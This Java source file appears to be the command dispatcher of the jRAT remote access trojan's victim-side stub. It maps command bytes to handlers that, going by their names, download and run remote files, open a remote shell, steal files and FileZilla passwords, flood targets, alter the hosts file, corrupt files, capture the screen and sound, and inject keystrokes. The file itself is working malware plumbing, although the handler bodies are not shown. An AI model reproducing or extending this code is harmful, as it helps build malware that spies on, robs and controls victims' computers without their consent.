package pro.jrat.stub.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import pro.jrat.common.PacketRange;
import pro.jrat.common.exceptions.PacketException;
import pro.jrat.stub.Plugin;


public abstract class AbstractIncomingPacket {

	public static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	static {
		incomingPackets.clear();
		incomingPackets.put(/* "MSGBOX" */(byte) 10, Packet10Messagebox.class);
		incomingPackets.put(/* "DISCONNECT" */(byte) 11, Packet11Disconnect.class);
		incomingPackets.put(/* "GETSCREEN" */(byte) 12, Packet12RemoteScreen.class);
		incomingPackets.put(/* "GETSCREENONCE" */(byte) 13, Packet13OneRemoteScreen.class);
		incomingPackets.put(/* "VISITURL" */(byte) 14, Packet14VisitURL.class);
		incomingPackets.put(/* "LISTFILES" */(byte) 15, Packet15ListFiles.class);
		incomingPackets.put(/* "DELETEFILE" */(byte) 16, Packet16DeleteFile.class);
		incomingPackets.put(/* "DLRUNURL" */(byte) 17, Packet17DownloadExecute.class);
		incomingPackets.put(/* "UPDATE" */(byte) 18, Packet18Update.class);
		incomingPackets.put(/* "LISTPROCESS" */(byte) 19, Packet19ListProcesses.class);
		incomingPackets.put(/* "KILLPROCESS" */(byte) 20, Packet20KillProcess.class);
		incomingPackets.put(/* "GETFILE" */(byte) 21, Packet21GetFile.class);
		incomingPackets.put(/* "FLOOD" */(byte) 22, Packet22Flood.class);
		incomingPackets.put(/* "RUNCMD" */(byte) 23, Packet23RemoteShellStart.class);
		incomingPackets.put(/* "ENDCMD" */(byte) 24, Packet24RemoteShellStop.class);
		incomingPackets.put(/* "EXEC" */(byte) 25, Packet25RemoteShellExecute.class);
		// TODO 26 free 
		incomingPackets.put(/* "REFRESHINFO" */(byte) 27, Packet27RefreshSystemInfo.class);
		incomingPackets.put(/* "SHUTDOWN" */(byte) 28, Packet28ShutdownComputer.class);
		incomingPackets.put(/* "RESTART" */(byte) 29, Packet29RestartComputer.class);
		incomingPackets.put(/* "LOGOUT" */(byte) 30, Packet30LogoutComputer.class);
		incomingPackets.put(/* "SLEEPMODE" */(byte) 31, Packet31ComputerSleep.class);
		incomingPackets.put(/* "LOCK" */(byte) 32, Packet32LockComputer.class);
		incomingPackets.put(/* "GETRAM" */(byte) 33, Packet33RAM.class);
		incomingPackets.put(/* "CUSTOMDL" */(byte) 34, Packet34AdvancedDownload.class);
		incomingPackets.put(/* "SCRIPT" */(byte) 35, Packet35Script.class);
		incomingPackets.put(/* "UNINSTALL" */(byte) 36, Packet36Uninstall.class);
		incomingPackets.put(/* "RESTARTC" */(byte) 37, Packet37RestartJavaProcess.class);
		incomingPackets.put(/* "REXEC" */(byte) 38, Packet38RunCommand.class);
		incomingPackets.put(/* "VISITURLMUCH" */(byte) 39, Packet39VisitManyURLs.class);
		incomingPackets.put(/* "THUMBNAIL" */(byte) 40, Packet40Thumbnail.class);
		incomingPackets.put(/* "DIR" */(byte) 41, Packet41SpecialDirectory.class);
		incomingPackets.put(/* "TAKEFILE" */(byte) 42, Packet42TakeFile.class);
		incomingPackets.put(/* "MKDIR" */(byte) 43, Packet43CreateDirectory.class);
		incomingPackets.put(/* "URLSOUND" */(byte) 44, Packet44PlaySoundFromURL.class);
		incomingPackets.put(/* "RECONNECT" */(byte) 45, Packet45Reconnect.class);
		incomingPackets.put(/* "CMOUSE" */(byte) 46, Packet46CrazyMouse.class);
		incomingPackets.put(/* "RNTO" */(byte) 47, Packet47RenameFile.class);
		incomingPackets.put(/* "STARTCHAT" */(byte) 48, Packet48ChatStart.class);
		incomingPackets.put(/* "ENDCHAT" */(byte) 49, Packet49ChatEnd.class);
		// TODO 50 free
		incomingPackets.put(/* "CHAT" */(byte) 51, Packet51ChatMessage.class);
		incomingPackets.put(/* "LOG" */(byte) 52, Packet52Log.class);
		incomingPackets.put(/* "FIND" */(byte) 53, Packet53StartSearch.class);
		incomingPackets.put(/* "EFIND" */(byte) 54, Packet54StopSearch.class);
		incomingPackets.put(/* "GETHOSTFI" */(byte) 55, Packet55HostsFile.class);
		incomingPackets.put(/* "UHOST" */(byte) 56, Packet56UpdateHostsFile.class);
		incomingPackets.put(/* "GETUT" */(byte) 57, Packet57UTorrentDownloads.class);
		incomingPackets.put(/* "NUDGE" */(byte) 58, Packet58NudgeChat.class);
		incomingPackets.put(/* "CBOARD" */(byte) 59, Packet59Clipboard.class);
		incomingPackets.put(/* "RD" */(byte) 60, Packet60PreviewFile.class);
		incomingPackets.put(/* "JVM" */(byte) 61, Packet61SystemJavaProperties.class);
		incomingPackets.put(/* "IMGP" */(byte) 62, Packet62PreviewImage.class);
		incomingPackets.put(/* "ZIP" */(byte) 63, Packet63PreviewArchive.class);
		incomingPackets.put(/* "MD5" */(byte) 64, Packet64FileHash.class);
		incomingPackets.put(/* "BEEP" */(byte) 65, Packet65Beep.class);
		incomingPackets.put(/* "PIA" */(byte) 66, Packet66PianoNote.class);
		incomingPackets.put(/* "CPIA" */(byte) 67, Packet67LongPianoNote.class);
		incomingPackets.put(/* "FZ" */(byte) 68, Packet68FileZillaPassword.class);
		incomingPackets.put(/* "PRINTER" */(byte) 69, Packet69Print.class);
		incomingPackets.put(/* "CORRUPT" */(byte) 70, Packet70CorruptFile.class);
		incomingPackets.put(/* "LISTLAN" */(byte) 71, Packet71LocalNetworkDevices.class);
		incomingPackets.put(/* "IPCONFIG" */(byte) 72, Packet72IPConfig.class);
		incomingPackets.put(/* "GETPORTS" */(byte) 73, Packet73ActivePorts.class);
		incomingPackets.put(/* "GC" */(byte) 74, Packet74GarbageCollect.class);
		// TODO 75 free
		incomingPackets.put(/* "SPEECH" */(byte) 76, Packet76Speech.class);
		incomingPackets.put(/* "LISTSER" */(byte) 77, Packet77ListServices.class);
		incomingPackets.put(/* "LISTSTARTUP" */(byte) 78, Packet78RegistryStartup.class);
		incomingPackets.put(/* "REG" */(byte) 79, Packet79BrowseRegistry.class);
		incomingPackets.put(/* "REGC" */(byte) 80, Packet80CustomRegQuery.class);
		incomingPackets.put(/* "LISTINSTALL" */(byte) 81, Packet81InstalledPrograms.class);
		incomingPackets.put(/* "LISTAD" */(byte) 82, Packet82NetworkAdapters.class);
		incomingPackets.put(/* "SYSINFO" */(byte) 83, Packet83WinSysInfo.class);
		incomingPackets.put(/* "SO" */(byte) 84, Packet84SoundCapture.class);
		incomingPackets.put(/* "LISTI" */(byte) 85, Packet85ThumbnailPreview.class);
		incomingPackets.put(/* "GETERRLOG" */(byte) 86, Packet86ErrorLog.class);
		incomingPackets.put(/* "DELERRLOG" */(byte) 87, Packet87DeleteErrorLog.class);
		incomingPackets.put(/* "GETSCONFIG" */(byte) 88, Packet88StubConfig.class);
		incomingPackets.put(/* "LOADPLUGINS" */(byte) 89, Packet89LoadedPlugins.class);
		incomingPackets.put(/* "PROP" */(byte) 90, Packet90SystemProperties.class);
		incomingPackets.put(/* "M" */(byte) 91, Packet91MouseMove.class);
		incomingPackets.put(/* "P" */(byte) 92, Packet92MousePress.class);
		incomingPackets.put(/* "R" */(byte) 93, Packet93MouseRelease.class);
		incomingPackets.put(/* "KP" */(byte) 94, Packet94KeyPress.class);
		incomingPackets.put(/* "KR" */(byte) 95, Packet95KeyRelease.class);
		incomingPackets.put(/* "VAR" */(byte) 96, Packet96EnvironmentVariables.class);
		incomingPackets.put(/* "LOCALES" */(byte) 97, Packet97Locales.class);
		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 98, Packet98QuickDesktop.class);
		incomingPackets.put(/* "ENC" */(byte) 99, Packet99Encryption.class);
	}

	public static final void execute(byte header) {
		try {
			AbstractIncomingPacket packet = null;
			Set<Byte> set = incomingPackets.keySet();
			for (byte b : set) {
				if (b == header) {
					packet = incomingPackets.get(b).newInstance();
					break;
				}
			}

			if (packet != null && header >= 0 && header <= PacketRange.incomingStubRange) {
				packet.read();
			} else {
				for (Plugin p : Plugin.list) {
					p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
				}
			}
		} catch (Exception ex) {
			PacketException ex1 = new PacketException("Failed to handle packet " + header, ex);
			ex1.printStackTrace();
		}
	}

	public abstract void read() throws Exception;

}
